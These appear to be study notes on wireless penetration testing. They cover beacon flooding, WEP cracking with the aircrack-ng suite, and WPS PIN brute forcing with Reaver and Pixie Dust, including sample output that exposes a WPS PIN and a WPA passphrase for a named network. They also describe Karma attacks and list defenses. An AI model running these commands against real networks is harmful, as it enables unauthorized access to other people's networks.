---
title: Wireless
---

# 4 different types of management frames:

### Beacons: Announce the presence of wireless networks
- Ad-hoc or infrastructure mode
- SSID
- Timestamp
- Channel info
- Supported data rates

Probes

Association

Authentication


Scanning for nearby wireless with this command:
iwlist wlan0 scan |grep ESSID


Beacon flood, -f will read from at text file, -g will show that they are 802.11g, -a will show them having WPA with AES encryption, -c is channel.
mdk3 wlan0mon -b 0f ssid.list -g -a -c 11


## WEP or Wired Equivalent Privacy
- Uses RC4 (Rivest Cipher 4)--stream cipher and a pre-shared key
- The plaintext data undergoes XOR operation to create a the encrypted ciphertext
- Can be either 64 or 128 bits--either case, an IV (initialization vector) makes up the first 24 bits of teh key to add randomness, making the key length actually 40 or 104bits.
- Main issue with WEP is that the 24-bit IV doesnt have enough randomness; at most 2^24 values.
- Given enough packets, IVs will be reused, and the same value will be used to generate the ciphertext.
- Throuh either sniffing the traffic or injecting traffic to create more IV, an attacker can gather enough packets to crack the key.
Steps
- Wireless in monitored(promiscous) mode, scan for a WEP network
- Inject fake authentication packets...will show the AP that we are ready to connect to it and provide a key
- Use ARP Request Relay Attack to generate more IVs--we will capture legitimate ARP requests and retransmit it to the AP.
- Watch for the data to hit around 10,000 to 250,000 to crack the key
*Just dont use WEP, even if its hidden.*

## WPS or Wi-Fi Protected Setup
- Designed to allow users to attach their devices to secure networks with an eight-digit pin instead of a potentially long and complex passpharse.
- Issue is that when the correct pin is supplied, the access point sends over the passphrase. regardless of WPA, WPA2
- The last digit of the pin is a checksum for the previous seven digits.
- First 4 are validated and the last 3 are sent separately...so about 11000 possibilities to guess the correct pin.
- Normally takes 4-8 hours
- Only protection would be to disable WPS on your wireless router.

[Vulnerability Note VU#723755](http://www.kb.cert.org/vuls/id/723755)

The WiFi Protected Setup (WPS) PIN is susceptible to a brute force attack. A design flaw that exists in the WPS specification for the PIN authentication significantly reduces the time required to brute force the entire PIN because it allows an attacker to know when the first half of the 8 digit PIN is correct. The lack of a proper lock out policy after a certain number of failed attempts to guess the PIN on many wireless routers makes this brute force attack that much more feasible.

#### Description

WiFi Protected Setup (WPS) is a computing standard created by the WiFi Alliance to ease the setup and securing of a wireless home network. WPS contains an authentication method called "external registrar" that only requires the router's PIN. By design this method is susceptible to brute force attacks against the PIN.

When the PIN authentication fails the access point will send an EAP-NACK message back to the client. The EAP-NACK messages are sent in a way that an attacker is able to determine if the first half of the PIN is correct. Also, the last digit of the PIN is known because it is a checksum for the PIN. This design greatly reduces the number of attempts needed to brute force the PIN. The number of attempts goes from 10^8 to 10^4 + 10^3 which is 11,000 attempts in total.

It has been reported that many wireless routers do not implement any kind of lock out policy for brute force attempts. This greatly reduces the time required to perform a successful brute force attack. It has also been reported that some wireless routers resulted in a denial-of-service condition because of the brute force attempt and required a reboot.

Ideally, the basic command works and the attack progresses as expected. But in reality, different manufacturers have been trying to implement protections against Reaver-style attacks, and additional options may be required to get the attack moving.

As an example, the following command adds a few optional switches that can help to get Reaver working on more picky devices:

`reaver -i mon0 -c 6 -b 00:23:69:48:33:95  -vv -L -N -d 15 -T .5 -r 3:15 `

The core command hasn’t changed, the additional switches just change how Reaver behaves:

 - -L [ Ignore locked WPS state. ]

 - -N [ Don't send NACK packets when errors are detected. ]

 - -d 15 [ Delay 15 seconds between PIN attempts. ]

 - -T [ Set timeout period to half a second. ]

 - -r 3:15 [ After 3 attempts, sleep for 15 seconds ]

```
ifconfig
iwconfig to see that its in managed mode
airmon-ng check kill
airmon-ng start wlan0
iwconfig to see that it is in monitor mode

airodumup-ng wlan0mon # to see wifi networks and the encryption.

wash -i wlan0mon # to scan for WPS enable networks

reaver -i wlan0mon -b 1C:AF:F7:CC:61:6B -vv -K 1
```

-A -vv or -v -v -A -vv

i have the best results with reaver , with the following commands
` reaver -i mon0 -b -c -f -v -d 0 -x 60 -A -n `,
at the same time in another terminal window aireplay-ng mon0 -1 120 -b -e


`aireplay-ng wlan0mon -1 120 -a 1C:AF:F7:CC:61:6B`

in the other windows

`reaver -i wlan0mon -c 1 -b 1C:AF:F7:CC:61:6B -d 60 --no-nacks -S --win7 -vv`

`reaver -i wlan0mon -b 1C:AF:F7:CC:61:6B -a -S -N -vv -c 1 -w -L`

`time reaver -i mon0 -c 11 -b 08:3E:0C:AD:9E:90 -K 1`
```
Reaver v1.5.2 WiFi Protected Setup Attack Tool
Copyright (c) 2011, Tactical Network Solutions, Craig Heffner <cheffner@tacnetsol.com>
mod by t6_x <t6_x@hotmail.com> & DataHead & Soxrok2212

[+] Waiting for beacon from 08:3E:0C:AD:9E:90
[+] Associated with 08:3E:0C:AD:9E:90 (ESSID: Team A2013)
[+] Starting Cracking Session. Pin count: 0, Max pin attempts: 11000
[P] E-Nonce: e5:05:10:63:a2:30:94:fb:9a:16:07:34:26:6a:d2:fb
[P] PKE: e7:8b:fe:8e:27:11:b0:d1:21:b1:ca:91:aa:f0:52:e8:6b:57:d2:55:8e:7d:c2:6a:a2:8e:56:c9:67:8a:8c:10:c9:4a:f2:1d:e9:e5:e1:80:3d:77:df:a3:44:e9:1c:dd:73:0f:65:0b:89:67:37:7a:7e:dc:52:15:9a:fc:be:d4:a9:2b:91:95:36:52:06:82:3a:12:85:9e:87:e2:05:ea:34:c5:d5:71:58:73:7c:42:5a:d6:cc:40:8a:4a:28:1a:f6:dd:29:38:56:fc:42:bd:73:75:7d:db:14:ef:16:89:fb:a1:02:35:cb:ea:de:c1:15:c9:d3:20:a5:67:c9:b4:2c:10:35:af:c5:e2:12:33:d2:23:e8:7e:3d:62:a1:c5:0f:ea:38:7e:fb:93:4c:a9:6c:af:d9:cd:ff:08:ad:5b:c0:ca:aa:98:b8:cd:2c:6b:d2:ec:14:60:f1:13:45:bc:70:ab:09:7d:de:ca:9e:29:b0:ff:6c:54:bd:43:00:47
[P] WPS Manufacturer: ARRIS
[P] WPS Model Name: TG862G
[P] WPS Model Number: RT2860
[P] Access Point Serial Number: 12345678
[P] R-Nonce: f9:fd:ad:9b:de:78:ba:f8:a3:b4:28:e5:b4:21:0a:aa
[P] PKR: 2b:08:3e:47:7a:3e:ed:a3:c7:76:cc:a9:17:52:46:c7:fa:1d:67:87:e6:1e:3e:b9:9b:e1:4c:58:b4:18:21:50:e1:28:87:66:9f:1a:33:5d:78:d3:33:72:68:55:a7:0d:da:c5:14:94:70:b6:3e:1a:9e:5d:98:2d:af:31:58:5a:db:78:53:0c:b1:9f:25:ad:dc:d8:4d:22:21:be:e5:e1:d2:98:23:d8:30:76:e5:39:eb:cb:67:1d:bc:ff:8b:6e:96:0f:df:1e:c8:01:c5:48:18:ca:6c:4d:8a:1f:74:68:29:89:a2:dd:d7:f2:31:eb:ea:07:5b:75:97:cc:4a:36:8d:84:3f:b8:19:1c:39:2b:90:3c:a4:c1:7a:b2:6a:97:f2:93:fa:fb:22:a1:df:44:a0:a4:b6:20:dd:91:e1:98:2a:f0:b9:ac:23:f0:e9:2d:8b:ec:cf:70:59:45:a9:ff:fb:67:1f:2c:00:7b:02:63:80:b7:ec:25:34:e8:46:6d
[P] AuthKey: 6b:e5:c2:12:44:99:e4:08:21:e9:44:bb:a9:0e:ba:7e:1b:9a:0b:df:72:11:02:1e:04:fb:b0:9b:15:4a:6c:60
[P] E-Hash1: f6:63:82:13:84:4d:ec:f3:d3:a4:f6:16:e7:60:1b:b6:ed:b5:32:2b:7b:cf:5c:6d:53:1a:40:7a:d8:43:b8:1b
[P] E-Hash2: b5:15:0f:18:ef:f0:41:a7:7c:6b:91:d2:c5:4b:ea:a3:d4:21:d7:6e:85:7a:58:16:82:a1:40:33:6e:e3:ce:97
[Pixie-Dust]
[Pixie-Dust]   Pixiewps 1.1
[Pixie-Dust]
[Pixie-Dust]   [*] E-S1:       00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
[Pixie-Dust]   [*] E-S2:       00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
[Pixie-Dust]   [+] WPS pin:    42000648
[Pixie-Dust]
[Pixie-Dust]   [*] Time taken: 0 s
[Pixie-Dust]
Running reaver with the correct pin, wait ...
Cmd : reaver -i mon0 -b 08:3E:0C:AD:9E:90 -c 11 -s y -vv -p 42000648

[Reaver Test] BSSID: 08:3E:0C:AD:9E:90
[Reaver Test] Channel: 11
[Reaver Test] [+] WPS PIN: '42000648'
[Reaver Test] [+] WPA PSK: '3113foreverandever'
[Reaver Test] [+] AP SSID: 'Team A2013'

real	2m46.367s
user	0m0.488s
sys	0m1.544s

```
---karma---
- What goes around...comes around
- Client devices like your laptop, phone, tablet are co  lnsitently sending out probes looking for the last wireless networks you connected to. Karma works by responding to these probes and responds that it is one of your remembered networks.
- You then connect(sometimes unknowingly) and your traffic can be monitored, spoof websites/DNS, inject code, or even strip ssl.
- Protections would be to pay attention to the networks you are connecting to, use a VPN to encrypt your traffic, on an iPhone you can set your wireless to Ask to Join Networks.
- Dont do sensitive things while at a coffee shop.
- Some developers have patched wireless drivers so they do not actively broadcast probe requests whilst connected to an Access Point

Sources

[Wiki](http://wiki.wifipineapple.com/index.php/Karma)
[Reaver](https://code.google.com/p/reaver-wps/)
Penetration Testing A Hands-On Introduction to Hacking by Georgia Weidman


## WEP Code
```
airodump-ng start (interface) #see what APs are using WEP

airodump-ng -c (channel) -w (file name) --bssid (bssid) (interface)

--Open another Konsole

aireplay-ng -1 0 -a (bssid) -h 00:11:22:33:44:55 -e (essid) (interface)

aireplay-ng -3 -b (bssid) -h (your:wireless:MAC) (interface)

----wait for Data to reach 10000

--Open third Konsole

aircrack-ng -b (bssid) (file name-01.cap)



airodump-ng -c 11 -w edimax --bssid 80:1F:02:25:86:0A mon0

aireplay-ng -1 0 -a 80:1F:02:25:86:0A -h 00:C0:CA:6C:9B:68 -e Edimax mon0

aireplay-ng -3 -b 80:1F:02:25:86:0A -h 00:C0:CA:6C:9B:68 mon0

aircrack-ng -b 80:1F:02:25:86:0A edimax-01.cap#
```
